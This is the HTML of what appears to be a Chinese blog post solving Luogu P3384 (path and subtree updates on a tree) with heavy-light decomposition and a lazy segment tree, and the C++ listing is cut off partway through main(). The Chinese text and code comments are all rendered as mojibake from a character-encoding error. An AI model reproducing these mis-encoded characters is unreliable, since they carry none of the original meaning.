            "content_html": "<p>åŸé¢˜åœ°å€:<a href=\"//www.luogu.org/problemnew/show/P3384\">https://www.luogu.org/problemnew/show/P3384</a>  </p>\n<h3 id=\"é¢˜ç›®ç®€è¿°\"><a href=\"#é¢˜ç›®ç®€è¿°\" class=\"headerlink\" title=\"é¢˜ç›®ç®€è¿°\"></a>é¢˜ç›®ç®€è¿°</h3><p>å·²çŸ¥ä¸€æ£µåŒ…å«Nä¸ªç»“ç‚¹çš„æ ‘ï¼ˆè¿é€šä¸”æ— ç¯ï¼‰ï¼Œæ¯ä¸ªèŠ‚ç‚¹ä¸ŠåŒ…å«ä¸€ä¸ªæ•°å€¼ï¼Œéœ€è¦æ”¯æŒä»¥ä¸‹æ“ä½œï¼š  </p>\n<ol>\n<li>æ ¼å¼ï¼š 1 x y z è¡¨ç¤ºå°†æ ‘ä»xåˆ°yç»“ç‚¹æœ€çŸ­è·¯å¾„ä¸Šæ‰€æœ‰èŠ‚ç‚¹çš„å€¼éƒ½åŠ ä¸Šz  </li>\n<li>æ ¼å¼ï¼š 2 x y è¡¨ç¤ºæ±‚æ ‘ä»xåˆ°yç»“ç‚¹æœ€çŸ­è·¯å¾„ä¸Šæ‰€æœ‰èŠ‚ç‚¹çš„å€¼ä¹‹å’Œ  </li>\n<li>æ ¼å¼ï¼š 3 x z è¡¨ç¤ºå°†ä»¥xä¸ºæ ¹èŠ‚ç‚¹çš„å­æ ‘å†…æ‰€æœ‰èŠ‚ç‚¹å€¼éƒ½åŠ ä¸Šz  </li>\n<li>æ ¼å¼ï¼š 4 x è¡¨ç¤ºæ±‚ä»¥xä¸ºæ ¹èŠ‚ç‚¹çš„å­æ ‘å†…æ‰€æœ‰èŠ‚ç‚¹å€¼ä¹‹å’Œ</li>\n</ol>\n<hr>\n<h3 id=\"æ€è·¯\"><a href=\"#æ€è·¯\" class=\"headerlink\" title=\"æ€è·¯\"></a>æ€è·¯</h3><p>æ ‘é“¾å‰–åˆ†è£¸é¢˜ã€‚åšé¢˜æ—¶çœ‹åˆ°ä¸å››ç§æ“ä½œä¸­çš„ä»»ä½•ä¸€ç§æä¸ºç›¸ä¼¼çš„æ“ä½œï¼Œå°±åº”è¯¥ç«‹åˆ»æƒ³åˆ°æ ‘é“¾å‰–åˆ†ï¼ˆå¹¶ä¸”è€ƒè™‘æ˜¯å¦ç»“åˆçº¿æ®µæ ‘è§£ç­”ï¼‰ã€‚<br>å…³äºæ ‘é“¾å‰–åˆ†çš„ä»‹ç»è¯·çœ‹æ­¤å¤„ï¼š<a href=\"//www.cnblogs.com/yyy2015c01/p/8457795.html\">ä¿¡æ¯å­¦ç«èµ›ç›¸å…³ä¼˜ç§€æ–‡ç« åˆé›†</a>  </p>\n<hr>\n<h3 id=\"ä»£ç \"><a href=\"#ä»£ç \" class=\"headerlink\" title=\"ä»£ç \"></a>ä»£ç </h3><p>å…·ä½“ä»‹ç»åœ¨æ³¨é‡Šé‡Œã€‚<br>æ¥æºï¼šæ´›è°·ç”¨æˆ·<a href=\"//www.luogu.org/space/show?uid=47062\">@zengqinyi</a>  </p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> Rint register int</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> mem(a,b) memset(a,(b),sizeof(a))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> Temp template<span class=\"string\">&lt;typename T&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">long</span> <span class=\"type\">long</span> LL;</span><br><span class=\"line\"><span class=\"function\">Temp <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">read</span><span class=\"params\">(T &amp;x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    x=<span class=\"number\">0</span>;T w=<span class=\"number\">1</span>,ch=<span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(!<span class=\"built_in\">isdigit</span>(ch)&amp;&amp;ch!=<span class=\"string\">&#x27;-&#x27;</span>)ch=<span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(ch==<span class=\"string\">&#x27;-&#x27;</span>)w=<span class=\"number\">-1</span>,ch=<span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">isdigit</span>(ch))x=(x&lt;&lt;<span class=\"number\">3</span>)+(x&lt;&lt;<span class=\"number\">1</span>)+(ch^<span class=\"string\">&#x27;0&#x27;</span>),ch=<span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">    x=x*w;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> mid ((l+r)&gt;&gt;1)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> lson rt&lt;&lt;1,l,mid</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> rson rt&lt;&lt;1|1,mid+1,r</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> len (r-l+1)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> maxn=<span class=\"number\">200000</span>+<span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> n,m,r,mod;</span><br><span class=\"line\"><span class=\"comment\">//è§é¢˜æ„ </span></span><br><span class=\"line\"><span class=\"type\">int</span> e,beg[maxn],nex[maxn],to[maxn],w[maxn],wt[maxn];</span><br><span class=\"line\"><span class=\"comment\">//é“¾å¼å‰å‘æ˜Ÿæ•°ç»„ï¼Œw[]ã€wt[]åˆå§‹ç‚¹æƒæ•°ç»„ </span></span><br><span class=\"line\"><span class=\"type\">int</span> a[maxn&lt;&lt;<span class=\"number\">2</span>],laz[maxn&lt;&lt;<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"comment\">//çº¿æ®µæ ‘æ•°ç»„ã€lazyæ“ä½œ </span></span><br><span class=\"line\"><span class=\"type\">int</span> son[maxn],id[maxn],fa[maxn],cnt,dep[maxn],siz[maxn],top[maxn]; </span><br><span class=\"line\"><span class=\"comment\">//son[]é‡å„¿å­ç¼–å·,id[]æ–°ç¼–å·,fa[]çˆ¶äº²èŠ‚ç‚¹,cnt dfs_clock/dfsåº,dep[]æ·±åº¦,siz[]å­æ ‘å¤§å°,top[]å½“å‰é“¾é¡¶ç«¯èŠ‚ç‚¹ </span></span><br><span class=\"line\"><span class=\"type\">int</span> res=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"comment\">//æŸ¥è¯¢ç­”æ¡ˆ </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> y)</span> <span class=\"comment\">//é“¾å¼å‰å‘æ˜ŸåŠ è¾¹ </span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    to[++e]=y;</span><br><span class=\"line\">    nex[e]=beg[x];</span><br><span class=\"line\">    beg[x]=e;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//-------------------------------------- ä»¥ä¸‹ä¸ºçº¿æ®µæ ‘ </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">pushdown</span><span class=\"params\">(<span class=\"type\">int</span> rt,<span class=\"type\">int</span> lenn)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    laz[rt&lt;&lt;<span class=\"number\">1</span>]+=laz[rt];</span><br><span class=\"line\">    laz[rt&lt;&lt;<span class=\"number\">1</span>|<span class=\"number\">1</span>]+=laz[rt];</span><br><span class=\"line\">    a[rt&lt;&lt;<span class=\"number\">1</span>]+=laz[rt]*(lenn-(lenn&gt;&gt;<span class=\"number\">1</span>));</span><br><span class=\"line\">    a[rt&lt;&lt;<span class=\"number\">1</span>|<span class=\"number\">1</span>]+=laz[rt]*(lenn&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\">    a[rt&lt;&lt;<span class=\"number\">1</span>]%=mod;</span><br><span class=\"line\">    a[rt&lt;&lt;<span class=\"number\">1</span>|<span class=\"number\">1</span>]%=mod;</span><br><span class=\"line\">    laz[rt]=<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">build</span><span class=\"params\">(<span class=\"type\">int</span> rt,<span class=\"type\">int</span> l,<span class=\"type\">int</span> r)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(l==r)&#123;</span><br><span class=\"line\">        a[rt]=wt[l];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(a[rt]&gt;mod)a[rt]%=mod;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">build</span>(lson);</span><br><span class=\"line\">    <span class=\"built_in\">build</span>(rson);</span><br><span class=\"line\">    a[rt]=(a[rt&lt;&lt;<span class=\"number\">1</span>]+a[rt&lt;&lt;<span class=\"number\">1</span>|<span class=\"number\">1</span>])%mod;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">query</span><span class=\"params\">(<span class=\"type\">int</span> rt,<span class=\"type\">int</span> l,<span class=\"type\">int</span> r,<span class=\"type\">int</span> L,<span class=\"type\">int</span> R)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(L&lt;=l&amp;&amp;r&lt;=R) &#123;</span><br><span class=\"line\">    \tres+=a[rt];</span><br><span class=\"line\">    \tres%=mod;</span><br><span class=\"line\">    \t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(laz[rt])<span class=\"built_in\">pushdown</span>(rt,len);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(L&lt;=mid)<span class=\"built_in\">query</span>(lson,L,R);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(R&gt;mid)<span class=\"built_in\">query</span>(rson,L,R);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"type\">int</span> rt,<span class=\"type\">int</span> l,<span class=\"type\">int</span> r,<span class=\"type\">int</span> L,<span class=\"type\">int</span> R,<span class=\"type\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(L&lt;=l&amp;&amp;r&lt;=R) &#123;</span><br><span class=\"line\">        laz[rt]+=k;</span><br><span class=\"line\">        a[rt]+=k*len;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(laz[rt])<span class=\"built_in\">pushdown</span>(rt,len);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(L&lt;=mid)<span class=\"built_in\">update</span>(lson,L,R,k);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(R&gt;mid)<span class=\"built_in\">update</span>(rson,L,R,k);</span><br><span class=\"line\">        a[rt]=(a[rt&lt;&lt;<span class=\"number\">1</span>]+a[rt&lt;&lt;<span class=\"number\">1</span>|<span class=\"number\">1</span>])%mod;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//---------------------------------ä»¥ä¸Šä¸ºçº¿æ®µæ ‘ </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">qRange</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> ans=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(top[x]!=top[y]) &#123;<span class=\"comment\">//å½“ä¸¤ä¸ªç‚¹ä¸åœ¨åŒä¸€æ¡é“¾ä¸Š </span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(dep[top[x]]&lt;dep[top[y]])</span><br><span class=\"line\">        \t<span class=\"built_in\">swap</span>(x,y);<span class=\"comment\">//æŠŠxç‚¹æ”¹ä¸ºæ‰€åœ¨é“¾é¡¶ç«¯çš„æ·±åº¦æ›´æ·±çš„é‚£ä¸ªç‚¹</span></span><br><span class=\"line\">        res=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">query</span>(<span class=\"number\">1</span>,<span class=\"number\">1</span>,n,id[top[x]],id[x]);<span class=\"comment\">//ansåŠ ä¸Šxç‚¹åˆ°xæ‰€åœ¨é“¾é¡¶ç«¯ è¿™ä¸€æ®µåŒºé—´çš„ç‚¹æƒå’Œ</span></span><br><span class=\"line\">        ans+=res;</span><br><span class=\"line\">        ans%=mod;<span class=\"comment\">//æŒ‰é¢˜æ„å–æ¨¡ </span></span><br><span class=\"line\">        x=fa[top[x]];<span class=\"comment\">//æŠŠxè·³åˆ°xæ‰€åœ¨é“¾é¡¶ç«¯çš„é‚£ä¸ªç‚¹çš„ä¸Šé¢ä¸€ä¸ªç‚¹</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//ç›´åˆ°ä¸¤ä¸ªç‚¹å¤„äºä¸€æ¡é“¾ä¸Š</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(dep[x]&gt;dep[y])<span class=\"built_in\">swap</span>(x,y);<span class=\"comment\">//æŠŠxç‚¹æ·±åº¦æ›´æ·±çš„é‚£ä¸ªç‚¹</span></span><br><span class=\"line\">    res=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">query</span>(<span class=\"number\">1</span>,<span class=\"number\">1</span>,n,id[x],id[y]);<span class=\"comment\">//è¿™æ—¶å†åŠ ä¸Šæ­¤æ—¶ä¸¤ä¸ªç‚¹çš„åŒºé—´å’Œå³å¯</span></span><br><span class=\"line\">    ans+=res;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans%mod;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">updRange</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> y,<span class=\"type\">int</span> k)</span> <span class=\"comment\">//åŒä¸Š</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123; </span><br><span class=\"line\">    k%=mod;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(top[x]!=top[y])&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(dep[top[x]]&lt;dep[top[y]])</span><br><span class=\"line\">        \t<span class=\"built_in\">swap</span>(x,y);</span><br><span class=\"line\">        <span class=\"built_in\">update</span>(<span class=\"number\">1</span>,<span class=\"number\">1</span>,n,id[top[x]],id[x],k);</span><br><span class=\"line\">        x=fa[top[x]];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(dep[x]&gt;dep[y])<span class=\"built_in\">swap</span>(x,y);</span><br><span class=\"line\">    <span class=\"built_in\">update</span>(<span class=\"number\">1</span>,<span class=\"number\">1</span>,n,id[x],id[y],k);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">qSon</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    res=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">query</span>(<span class=\"number\">1</span>,<span class=\"number\">1</span>,n,id[x],id[x]+siz[x]<span class=\"number\">-1</span>);<span class=\"comment\">//å­æ ‘åŒºé—´å³ç«¯ç‚¹ä¸ºid[x]+siz[x]-1 </span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">updSon</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> k)</span> <span class=\"comment\">//åŒä¸Š</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123; </span><br><span class=\"line\">    <span class=\"built_in\">update</span>(<span class=\"number\">1</span>,<span class=\"number\">1</span>,n,id[x],id[x]+siz[x]<span class=\"number\">-1</span>,k);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">dfs1</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> f,<span class=\"type\">int</span> deep)</span> <span class=\"comment\">//xå½“å‰èŠ‚ç‚¹ï¼Œfçˆ¶äº²ï¼Œdeepæ·±åº¦ </span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123; </span><br><span class=\"line\">    dep[x]=deep;<span class=\"comment\">//æ ‡è®°æ¯ä¸ªç‚¹çš„æ·±åº¦ </span></span><br><span class=\"line\">    fa[x]=f;<span class=\"comment\">//æ ‡è®°æ¯ä¸ªç‚¹çš„çˆ¶äº² </span></span><br><span class=\"line\">    siz[x]=<span class=\"number\">1</span>;<span class=\"comment\">//æ ‡è®°æ¯ä¸ªéå¶å­èŠ‚ç‚¹çš„å­æ ‘å¤§å° </span></span><br><span class=\"line\">    <span class=\"type\">int</span> maxson=<span class=\"number\">-1</span>;<span class=\"comment\">//è®°å½•é‡å„¿å­çš„å„¿å­æ•° </span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(Rint i=beg[x];i;i=nex[i]) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> y=to[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(y==f)</span><br><span class=\"line\">        \t<span class=\"keyword\">continue</span>;<span class=\"comment\">//è‹¥ä¸ºçˆ¶äº²åˆ™continue </span></span><br><span class=\"line\">        <span class=\"built_in\">dfs1</span>(y,x,deep+<span class=\"number\">1</span>);<span class=\"comment\">//dfså…¶å„¿å­ </span></span><br><span class=\"line\">        siz[x]+=siz[y];<span class=\"comment\">//æŠŠå®ƒçš„å„¿å­æ•°åŠ åˆ°å®ƒèº«ä¸Š </span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(siz[y]&gt;maxson)son[x]=y,maxson=siz[y];<span class=\"comment\">//æ ‡è®°æ¯ä¸ªéå¶å­èŠ‚ç‚¹çš„é‡å„¿å­ç¼–å· </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">dfs2</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> topf)</span> <span class=\"comment\">//xå½“å‰èŠ‚ç‚¹ï¼Œtopfå½“å‰é“¾çš„æœ€é¡¶ç«¯çš„èŠ‚ç‚¹ </span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    id[x]=++cnt;<span class=\"comment\">//æ ‡è®°æ¯ä¸ªç‚¹çš„æ–°ç¼–å· </span></span><br><span class=\"line\">    wt[cnt]=w[x];<span class=\"comment\">//æŠŠæ¯ä¸ªç‚¹çš„åˆå§‹å€¼èµ‹åˆ°æ–°ç¼–å·ä¸Šæ¥ </span></span><br><span class=\"line\">    top[x]=topf;<span class=\"comment\">//è¿™ä¸ªç‚¹æ‰€åœ¨é“¾çš„é¡¶ç«¯ </span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!son[x])</span><br><span class=\"line\">    \t<span class=\"keyword\">return</span>;<span class=\"comment\">//å¦‚æœæ²¡æœ‰å„¿å­åˆ™è¿”å› </span></span><br><span class=\"line\">    <span class=\"built_in\">dfs2</span>(son[x],topf);<span class=\"comment\">//æŒ‰å…ˆå¤„ç†é‡å„¿å­ï¼Œå†å¤„ç†è½»å„¿å­çš„é¡ºåºé€’å½’å¤„ç† </span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(Rint i=beg[x];i;i=nex[i]) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> y=to[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(y==fa[x]||y==son[x])<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        <span class=\"built_in\">dfs2</span>(y,y);<span class=\"comment\">//å¯¹äºæ¯ä¸€ä¸ªè½»å„¿å­éƒ½æœ‰ä¸€æ¡ä»å®ƒè‡ªå·±å¼€å§‹çš„é“¾ </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">read</span>(n);</span><br><span class=\"line\">    <span class=\"built_in\">read</span>(m);</span><br><span class=\"line\">    <span class=\"built_in\">read</span>(r);</span><br><span class=\"line\">    <span class=\"built_in\">read</span>(mod);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(Rint i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">        <span class=\"built_in\">read</span>(w[i]);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(Rint i=<span class=\"number\">1</span>;i&lt;n;i++) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> a,b;</span><br><span class=\"line\">        <span class=\"built_in\">read</span>(a);<span class=\"built_in\">read</span>(b);</span><br><span class=\"line\">        <span class=\"built_in\">add</span>(a,b);<span class=\"built_in\">add</span>(b,a);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">dfs1</span>(r,<span class=\"number\">0</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"built_in\">dfs2</span>(r,r);</span><br><span class=\"line\">    <span class=\"built_in\">build</span>(<span class=\"number\">1</span>,<span class=\"number\">1</span>,n);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(m--) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> k,x,y,z;</span><br><span class=\"line\">        <span class=\"built_in\">read</span>(k);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(k==<span 